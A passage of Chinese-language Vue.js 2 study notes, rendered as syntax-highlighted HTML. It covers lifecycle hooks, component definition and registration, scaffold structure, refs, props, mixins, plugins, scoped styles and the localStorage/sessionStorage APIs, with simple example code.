punctuation">&#123;</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'mounted'</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">)</span>      <span class="token function">setInterval</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>opacity <span class="token operator">-=</span> <span class="token number">0.01</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>opacity <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">this</span><span class="token punctuation">.</span>opacity <span class="token operator">=</span> <span class="token number">1</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token comment">//通过外部的定时器实现（不推荐）</span>  <span class="token comment">/* setInterval(() => &#123;    vm.opacity -= 0.01    if(vm.opacity &lt;= 0) vm.opacity = 1  &#125;,16) */</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><h3 id="2-生命周期图"><a href="#2-生命周期图" class="headerlink" title="2. 生命周期图"></a>2. 生命周期图</h3><p><img src="/vue/vuesmzq.png"></p><h3 id="3-常用的生命周期钩子"><a href="#3-常用的生命周期钩子" class="headerlink" title="3. 常用的生命周期钩子"></a>3. 常用的生命周期钩子</h3><ol><li><p>mounted: 发送ajax请求、启动定时器、绑定自定义事件、订阅消息等【初始化操作】</p></li><li><p>beforeDestroy: 清除定时器、解绑自定义事件、取消订阅消息等【收尾工作】</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token operator">&lt;</span>div id<span class="token operator">=</span><span class="token string">"root"</span><span class="token operator">></span>  <span class="token operator">&lt;</span>h2 <span class="token operator">:</span>style<span class="token operator">=</span><span class="token string">"&#123;opacity&#125;"</span><span class="token operator">></span>欢迎学习Vue<span class="token operator">&lt;</span><span class="token operator">/</span>h2<span class="token operator">></span>  <span class="token operator">&lt;</span>button @click<span class="token operator">=</span><span class="token string">"opacity = 1"</span><span class="token operator">></span>透明度设置为<span class="token number">1</span><span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">></span>  <span class="token operator">&lt;</span>button @click<span class="token operator">=</span><span class="token string">"stop"</span><span class="token operator">></span>点我停止变换<span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span><span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span><span class="token operator">></span>  <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    el<span class="token operator">:</span> <span class="token string">'#root'</span><span class="token punctuation">,</span>    data<span class="token operator">:</span> <span class="token punctuation">&#123;</span>      opacity<span class="token operator">:</span> <span class="token number">1</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    methods<span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token function">stop</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">$destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token comment">//Vue完成模板的解析并把初始的真实DOM元素放入页面后（挂载完毕）调用mounted</span>    <span class="token function">mounted</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'mounted'</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">)</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>timer <span class="token operator">=</span> <span class="token function">setInterval</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'setInterval'</span><span class="token punctuation">)</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>opacity <span class="token operator">-=</span> <span class="token number">0.01</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>opacity <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">this</span><span class="token punctuation">.</span>opacity <span class="token operator">=</span> <span class="token number">1</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token function">beforeDestroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token function">clearInterval</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>timer<span class="token punctuation">)</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'vm即将驾鹤西游了'</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><h3 id="4-关于销毁Vue实例"><a href="#4-关于销毁Vue实例" class="headerlink" title="4. 关于销毁Vue实例"></a>4. 关于销毁Vue实例</h3></li><li><p>销毁后借助Vue开发者工具看不到任何信息</p></li><li><p>销毁后自定义事件会失效,但原生DOM事件依然有效</p></li><li><p>一般不会在beforeDestroy操作数据,因为即便操作数据,也不会触发更新流程了</p></li></ol><h2 id="十八、组件"><a href="#十八、组件" class="headerlink" title="十八、组件"></a>十八、组件</h2><h3 id="1-Vue中使用组件的三大步骤"><a href="#1-Vue中使用组件的三大步骤" class="headerlink" title="1. Vue中使用组件的三大步骤"></a>1. Vue中使用组件的三大步骤</h3><p> ①定义组件(创建组件)<br> ②注册组件<br> ③使用组件(写组件标签)</p><h3 id="2-如何定义一个组件"><a href="#2-如何定义一个组件" class="headerlink" title="2. 如何定义一个组件"></a>2. 如何定义一个组件</h3><ol><li><p>使用Vue.extend(options)创建,其中options和new Vue(options)时传入的那个options几乎一样,但也有点区别</p></li><li><p>区别<br>① el不要写,为什么？<br>最终所有的组件都要经过一个vm的管理,由vm中的el决定服务哪个容器</p><p>② data必须写成函数,为什么？<br>避免组件被复用时,数据存在引用关系</p><p>③ 备注<br>使用template可以配置组件结构</p></li></ol><h3 id="3-编写组件标签"><a href="#3-编写组件标签" class="headerlink" title="3. 编写组件标签"></a>3. 编写组件标签</h3><p>  ①<code>&lt;组件名 /&gt;</code><br>  ②<code>&lt;组件名&gt;&lt;/组件名&gt;</code></p> <pre class="language-js" data-language="js"><code class="language-js"><span class="token operator">&lt;</span>div id<span class="token operator">=</span><span class="token string">"root"</span><span class="token operator">></span>  <span class="token operator">&lt;</span>hello<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>hello<span class="token operator">></span>  <span class="token operator">&lt;</span>hr<span class="token operator">></span>  <span class="token operator">&lt;</span>h1<span class="token operator">></span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>msg<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>h1<span class="token operator">></span>  <span class="token operator">&lt;</span>hr<span class="token operator">></span>  <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> 第三步：编写组件标签 <span class="token operator">--</span><span class="token operator">></span>  <span class="token operator">&lt;</span>school<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>school<span class="token operator">></span>  <span class="token operator">&lt;</span>hr<span class="token operator">></span>  <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> 第三步：编写组件标签 <span class="token operator">--</span><span class="token operator">></span>  <span class="token operator">&lt;</span>student<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>student<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span><span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span><span class="token operator">></span>  <span class="token comment">//第一步：创建school组件</span>  <span class="token keyword">const</span> school <span class="token operator">=</span> Vue<span class="token punctuation">.</span><span class="token function">extend</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">        &lt;div class="demo">          &lt;h2>学校名称：&#123;&#123;schoolName&#125;&#125;&lt;/h2>          &lt;h2>学校地址：&#123;&#123;address&#125;&#125;&lt;/h2>          &lt;button @click="showName">点我提示学校名&lt;/button>        &lt;/div>      </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>    <span class="token comment">// el:'#root', //组件定义时，一定不要写el配置项，因为最终所有的组件都要被一个vm管理，由vm决定服务于哪个容器。</span>    <span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token punctuation">&#123;</span>        schoolName<span class="token operator">:</span> <span class="token string">'辉煌学堂'</span><span class="token punctuation">,</span>        address<span class="token operator">:</span> <span class="token string">'北京昌平'</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    methods<span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token function">showName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">alert</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>schoolName<span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token comment">//第一步：创建student组件</span>  <span class="token keyword">const</span> student <span class="token operator">=</span> Vue<span class="token punctuation">.</span><span class="token function">extend</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">        &lt;div>          &lt;h2>学生姓名：&#123;&#123;studentName&#125;&#125;&lt;/h2>          &lt;h2>学生年龄：&#123;&#123;age&#125;&#125;&lt;/h2>        &lt;/div>      </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>    <span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token punctuation">&#123;</span>        studentName<span class="token operator">:</span> <span class="token string">'张三'</span><span class="token punctuation">,</span>        age<span class="token operator">:</span> <span class="token number">18</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token comment">//第一步：创建hello组件</span>  <span class="token keyword">const</span> hello <span class="token operator">=</span> Vue<span class="token punctuation">.</span><span class="token function">extend</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">        &lt;div>          &lt;h2>你好啊！&#123;&#123;name&#125;&#125;&lt;/h2>        &lt;/div>      </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>    <span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token punctuation">&#123;</span>        name<span class="token operator">:</span> <span class="token string">'Tom'</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token comment">//第二步：全局注册组件</span>  Vue<span class="token punctuation">.</span><span class="token function">component</span><span class="token punctuation">(</span><span class="token string">'hello'</span><span class="token punctuation">,</span> hello<span class="token punctuation">)</span>  <span class="token comment">//创建vm</span>  <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    el<span class="token operator">:</span> <span class="token string">'#root'</span><span class="token punctuation">,</span>    data<span class="token operator">:</span> <span class="token punctuation">&#123;</span>      msg<span class="token operator">:</span> <span class="token string">'你好啊！'</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token comment">//第二步：注册组件（局部注册）</span>    components<span class="token operator">:</span> <span class="token punctuation">&#123;</span>      school<span class="token punctuation">,</span>      student    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><h3 id="4-几个注意点"><a href="#4-几个注意点" class="headerlink" title="4. 几个注意点"></a>4. 几个注意点</h3><h4 id="4-1-关于组件名"><a href="#4-1-关于组件名" class="headerlink" title="4.1 关于组件名"></a>4.1 关于组件名</h4><p> ① 一个单词组成<br>  第一种写法(首字母小写): school<br>  第二种写法(首字母大写): School</p><p> ② 多个单词组成<br>  第一种写法(kebab-case命名): my-school<br>  第二种写法(CamelCase命名): MySchool (需要Vue脚手架支持)</p><p> ③ 备注<br>  (1) 组件名尽可能回避HTML中已有的元素名称,例如: h2、H2都不行</p><p>  (2) 可以使用name配置项指定组件在开发者工具中呈现的名字</p><h4 id="4-2-关于组件标签"><a href="#4-2-关于组件标签" class="headerlink" title="4.2 关于组件标签"></a>4.2 关于组件标签</h4><p> 第一种写法: <code>&lt;school&gt;&lt;/school&gt;</code><br> 第二种写法: <code>&lt;school /&gt;</code><br> 备注: 不用使用脚手架时,<code>&lt;school/&gt;</code>会导致后续组件不能渲染(写了多个,只渲染出一个)</p><h4 id="4-3-简写方式"><a href="#4-3-简写方式" class="headerlink" title="4.3 简写方式"></a>4.3 简写方式</h4><p> <code>const school = Vue.extend(options) </code><br> 可简写为：const school = options</p><h3 id="5-关于VueComponent"><a href="#5-关于VueComponent" class="headerlink" title="5. 关于VueComponent"></a>5. 关于VueComponent</h3><p> 1.school组件本质是一个名为VueComponent的构造函数,且不是程序员定义的,是Vue.extend生成的</p><p> 2.我们只需要写<code>&lt;school/&gt;</code> 或 <code>&lt;school&gt;&lt;/school&gt;</code>,Vue解析时会帮我们创建school组件的实例对象,即Vue帮我们执行的:<code> new VueComponent(options)</code></p><p> 3.特别注意<br>  每次调用Vue.extend,返回的都是一个全新的VueComponent</p><p> 4.关于this指向<br>  Ⅰ. 组件配置中<br>   data函数、methods中的函数、watch中的函数、computed中的函数,它们的this均是【VueComponent实例对象】</p><p>  Ⅱ. new Vue(options)配置中<br>   data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【Vue实例对象】</p><p>  5.VueComponent的实例对象，以后简称vc(也可称之为：组件实例对象)<br>  Vue的实例对象，以后简称vm。</p>  <pre class="language-js" data-language="js"><code class="language-js">  <span class="token operator">&lt;</span>div id<span class="token operator">=</span><span class="token string">"root"</span><span class="token operator">></span>   <span class="token operator">&lt;</span>school<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>school<span class="token operator">></span>   <span class="token operator">&lt;</span>hello<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>hello<span class="token operator">></span> <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span> <span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span><span class="token operator">></span> <span class="token comment">//定义school组件</span> <span class="token keyword">const</span> school <span class="token operator">=</span> Vue<span class="token punctuation">.</span><span class="token function">extend</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>   name<span class="token operator">:</span> <span class="token string">'school'</span><span class="token punctuation">,</span>   template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;div>&lt;h2>学校名称：&#123;&#123;name&#125;&#125;&lt;/h2>&lt;h2>学校地址：&#123;&#123;address&#125;&#125;&lt;/h2>&lt;button @click="showName">点我提示学校名&lt;/button>&lt;/div></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>   <span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">return</span> <span class="token punctuation">&#123;</span>       name<span class="token operator">:</span> <span class="token string">'辉煌堂'</span><span class="token punctuation">,</span>       address<span class="token operator">:</span> <span class="token string">'北京'</span>     <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>   methods<span class="token operator">:</span> <span class="token punctuation">&#123;</span>     <span class="token function">showName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>       console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'showName'</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">)</span>     <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token keyword">const</span> test <span class="token operator">=</span> Vue<span class="token punctuation">.</span><span class="token function">extend</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>   template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;span>atguigu&lt;/span></span><span class="token template-punctuation string">`</span></span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token comment">//定义hello组件</span> <span class="token keyword">const</span> hello <span class="token operator">=</span> Vue<span class="token punctuation">.</span><span class="token function">extend</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>   template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;div>&lt;h2>&#123;&#123;msg&#125;&#125;&lt;/h2>&lt;test>&lt;/test>&lt;/div></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>   <span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">return</span> <span class="token punctuation">&#123;</span>       msg<span class="token operator">:</span> <span class="token string">'你好啊！'</span>     <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>   components<span class="token operator">:</span> <span class="token punctuation">&#123;</span>     test   <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token comment">//创建vm</span> <span class="token keyword">const</span> vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>   el<span class="token operator">:</span> <span class="token string">'#root'</span><span class="token punctuation">,</span>   components<span class="token operator">:</span> <span class="token punctuation">&#123;</span>     school<span class="token punctuation">,</span>     hello   <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><h2 id="十九、分析脚手架"><a href="#十九、分析脚手架" class="headerlink" title="十九、分析脚手架"></a>十九、分析脚手架</h2><h3 id="1-脚手架文件结构"><a href="#1-脚手架文件结构" class="headerlink" title="1. 脚手架文件结构"></a>1. 脚手架文件结构</h3><pre class="language-js" data-language="js"><code class="language-js">├── node_modules ├── <span class="token keyword">public</span>│   ├── favicon<span class="token punctuation">.</span>ico<span class="token operator">:</span> 页签图标│   └── index<span class="token punctuation">.</span>html<span class="token operator">:</span> 主页面├── src│   ├── assets<span class="token operator">:</span> 存放静态资源│   │   └── logo<span class="token punctuation">.</span>png│   │── component<span class="token operator">:</span> 存放组件│   │   └── HelloWorld<span class="token punctuation">.</span>vue│   │── App<span class="token punctuation">.</span>vue<span class="token operator">:</span> 汇总所有组件│   │── main<span class="token punctuation">.</span>js<span class="token operator">:</span> 入口文件├── <span class="token punctuation">.</span>gitignore<span class="token operator">:</span> git版本管制忽略的配置├── babel<span class="token punctuation">.</span>config<span class="token punctuation">.</span>js<span class="token operator">:</span> babel的配置文件├── <span class="token keyword">package</span><span class="token punctuation">.</span>json<span class="token operator">:</span> 应用包配置文件 ├── <span class="token constant">README</span><span class="token punctuation">.</span>md<span class="token operator">:</span> 应用描述文件├── <span class="token keyword">package</span><span class="token operator">-</span>lock<span class="token punctuation">.</span>json：包版本控制文件</code></pre><h2 id="二十、Vue的不同版本"><a href="#二十、Vue的不同版本" class="headerlink" title="二十、Vue的不同版本"></a>二十、Vue的不同版本</h2><h3 id="1-关于vue-js与vue-runtime-xxx-js的区别"><a href="#1-关于vue-js与vue-runtime-xxx-js的区别" class="headerlink" title="1. 关于vue.js与vue.runtime.xxx.js的区别"></a>1. 关于vue.js与vue.runtime.xxx.js的区别</h3><p> ①vue.js是完整版的Vue，包含：核心功能 + 模板解析器</p><p> ②vue.runtime.xxx.js是运行版的Vue，只包含：核心功能；没有模板解析器</p><h3 id="2-vue-runtime-xxx-js"><a href="#2-vue-runtime-xxx-js" class="headerlink" title="2. vue.runtime.xxx.js"></a>2. vue.runtime.xxx.js</h3><p> 因为vue.runtime.xxx.js没有模板解析器，所以不能使用template这个配置项，需要使用render函数接收到的createElement函数去指定具体内容</p><h2 id="二十一、Vue-config-js"><a href="#二十一、Vue-config-js" class="headerlink" title="二十一、Vue.config.js"></a>二十一、Vue.config.js</h2><p> 1.使用vue inspect &gt; output.js 可以查看Vue脚手架的默认配置</p><p> 2.使用Vue.config.js可以对脚手架进行个性化定制,详情见: <a href="https://cli.vuejs.org/zh">https://cli.vuejs.org/zh</a></p><h2 id="二十二、ref属性"><a href="#二十二、ref属性" class="headerlink" title="二十二、ref属性"></a>二十二、ref属性</h2><p> 1.被用来给元素或子组件注册引用信息(id的替代者)</p><p> 2.应用在html标签上获取的是真实DOM元素，应用在组件标签上是组件实例对象(vc)</p><p> 3.使用方式<br>  ①打标识: <code>&lt;h1 ref=&quot;xxx&quot;&gt;.....&lt;/h1&gt;``` 或 ```&lt;School ref=&quot;xxx&quot;&gt;&lt;/School&gt;</code></p><p>  ②获取: this.$refs.xxx</p><h2 id="二十三、props配置项"><a href="#二十三、props配置项" class="headerlink" title="二十三、props配置项"></a>二十三、props配置项</h2><h3 id="1-功能"><a href="#1-功能" class="headerlink" title="1. 功能"></a>1. 功能</h3><p> 让组件接收外部传过来的数据</p><h3 id="2-传递数据"><a href="#2-传递数据" class="headerlink" title="2. 传递数据"></a>2. 传递数据</h3><p> <code>&lt;Demo name=&quot;xxx&quot;/&gt;</code></p><h3 id="3-接收数据"><a href="#3-接收数据" class="headerlink" title="3. 接收数据"></a>3. 接收数据</h3><p> ①第一种方式(只接收):<br> <pre class="language-js" data-language="js"><code class="language-js">props<span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span></code></pre><br> ②第二种方式(限制类型):<br> <pre class="language-js" data-language="js"><code class="language-js">props<span class="token operator">:</span><span class="token punctuation">&#123;</span>name<span class="token operator">:</span>String<span class="token punctuation">&#125;</span></code></pre><br> ③第三种方式(限制类型、限制必要性、指定默认值)<br>  <pre class="language-js" data-language="js"><code class="language-js">props<span class="token operator">:</span><span class="token punctuation">&#123;</span>name<span class="token operator">:</span><span class="token punctuation">&#123;</span> type<span class="token operator">:</span>String<span class="token punctuation">,</span> <span class="token comment">//类型</span> required<span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token comment">//必要性</span> <span class="token keyword">default</span><span class="token operator">:</span><span class="token string">'老王'</span> <span class="token comment">//默认值</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>备注：props是只读的，Vue底层会监测你对props的修改，如果进行了修改，就会发出警告，若业务需求确实需要修改，那么请复制props的内容到data中一份，然后去修改data中的数据。</code></pre></p><h2 id="二十四、minin-混入"><a href="#二十四、minin-混入" class="headerlink" title="二十四、minin(混入)"></a>二十四、minin(混入)</h2><h3 id="1-功能-1"><a href="#1-功能-1" class="headerlink" title="1. 功能"></a>1. 功能</h3><p> 可以把多个组件共用的配置提取成一个混入对象</p><h3 id="2-使用方式"><a href="#2-使用方式" class="headerlink" title="2. 使用方式"></a>2. 使用方式</h3><p> ①第一步定义混合<br>   <pre class="language-js" data-language="js"><code class="language-js"><span class="token punctuation">&#123;</span>  <span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token operator">...</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  methods<span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token operator">...</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span>  <span class="token operator">...</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span></code></pre><br> ②第二步使用混入<br>  全局混入: <code>Vue.mixin(xxx)</code><br>  局部混入: <code>mixins:[&#39;xxx&#39;]</code></p><h2 id="二十五、插件"><a href="#二十五、插件" class="headerlink" title="二十五、插件"></a>二十五、插件</h2><h3 id="1-功能-2"><a href="#1-功能-2" class="headerlink" title="1. 功能"></a>1. 功能</h3><p> 用于增强vue</p><h3 id="2-本质"><a href="#2-本质" class="headerlink" title="2. 本质"></a>2. 本质</h3><p> 包含install方法的一个对象,install的第一个参数是Vue,第二个以后的参数是插件使用者传递的数据</p><h3 id="3-插件定义与使用"><a href="#3-插件定义与使用" class="headerlink" title="3. 插件定义与使用"></a>3. 插件定义与使用</h3><h4 id="3-1-定义"><a href="#3-1-定义" class="headerlink" title="3.1 定义"></a>3.1 定义</h4> <pre class="language-js" data-language="js"><code class="language-js">对象<span class="token punctuation">.</span><span class="token function-variable function">install</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">Vue<span class="token punctuation">,</span> options</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token comment">// 1. 添加全局过滤器</span>   Vue<span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token operator">...</span><span class="token punctuation">.</span><span class="token punctuation">)</span>   <span class="token comment">// 2. 添加全局指令</span>   Vue<span class="token punctuation">.</span><span class="token function">directive</span><span class="token punctuation">(</span><span class="token operator">...</span><span class="token punctuation">.</span><span class="token punctuation">)</span>   <span class="token comment">// 3. 配置全局混入(合)</span>   Vue<span class="token punctuation">.</span><span class="token function">mixin</span><span class="token punctuation">(</span><span class="token operator">...</span><span class="token punctuation">.</span><span class="token punctuation">)</span>   <span class="token comment">// 4. 添加实例方法</span>   <span class="token class-name">Vue</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">$myMethod</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token operator">...</span><span class="token punctuation">&#125;</span>   <span class="token class-name">Vue</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>$myProperty <span class="token operator">=</span> xxxx<span class="token punctuation">&#125;</span></code></pre><h4 id="3-2-使用"><a href="#3-2-使用" class="headerlink" title="3.2 使用"></a>3.2 使用</h4><p> <code>Vue.use() </code></p><h2 id="二十六、-scoped样式"><a href="#二十六、-scoped样式" class="headerlink" title="二十六、 scoped样式"></a>二十六、 scoped样式</h2><p> 1.作用<br>  让样式在局部生效,防止冲突</p><p> 2.写法<br>  <code>&lt;style scoped&gt; </code></p><h2 id="二十七、webStorage"><a href="#二十七、webStorage" class="headerlink" title="二十七、webStorage"></a>二十七、webStorage</h2><h3 id="1-存储大小"><a href="#1-存储大小" class="headerlink" title="1. 存储大小"></a>1. 存储大小</h3><p> 存储内容大小一般支持5MB左右(不同浏览器可能还不一样)</p><h3 id="2-本地存储"><a href="#2-本地存储" class="headerlink" title="2. 本地存储"></a>2. 本地存储</h3><p> 浏览器通过Window.sessionStorage 和 Window.localStorage属性来实现本地存储机制</p><h3 id="3-相关API"><a href="#3-相关API" class="headerlink" title="3. 相关API"></a>3. 相关API</h3><h4 id="①-xxxxxStorage-setItem-39-key-39-39-value-39"><a href="#①-xxxxxStorage-setItem-39-key-39-39-value-39" class="headerlink" title="① xxxxxStorage.setItem(&#39;key&#39;, &#39;value&#39;);"></a>① <code>xxxxxStorage.setItem(&#39;key&#39;, &#39;value&#39;);</code></h4><p>  该方法接收一个键和值作为参数,会把键值对添加到存储中,如果键名存在,则更新其对应的值</p><h4 id="②-xxxxxStorage-getItem-39-person-39"><a href="#②-xxxxxStorage-getItem-39-person-39" class="headerlink" title="② xxxxxStorage.getItem(&#39;person&#39;);"></a>② <code>xxxxxStorage.getItem(&#39;person&#39;);</code></h4><p>  该方法接收一个键名作为参数,返回键名对应的值</p><h4 id="③-xxxxxStorage-removeItem-39-key-39"><a href="#③-xxxxxStorage-removeItem-39-key-39" class="headerlink" title="③ xxxxxStorage.removeItem(&#39;key&#39;);"></a>③ <code>xxxxxStorage.removeItem(&#39;key&#39;);</code></h4><p>  该方法接收一个键名作为参数,并把该键名从存储中删除</p><h4 id="④-xxxxxStorage-clear"><a href="#④-xxxxxStorage-clear" class="headerlink" title="④  xxxxxStorage.clear()"></a>④ <code> xxxxxStorage.clear()</code></h4><p>  该方法会清空存储中的所有数据</p><h3 id="4-备注-1"><a href="#4-备注-1" class="headerlink" title="4. 备注"></a>4. 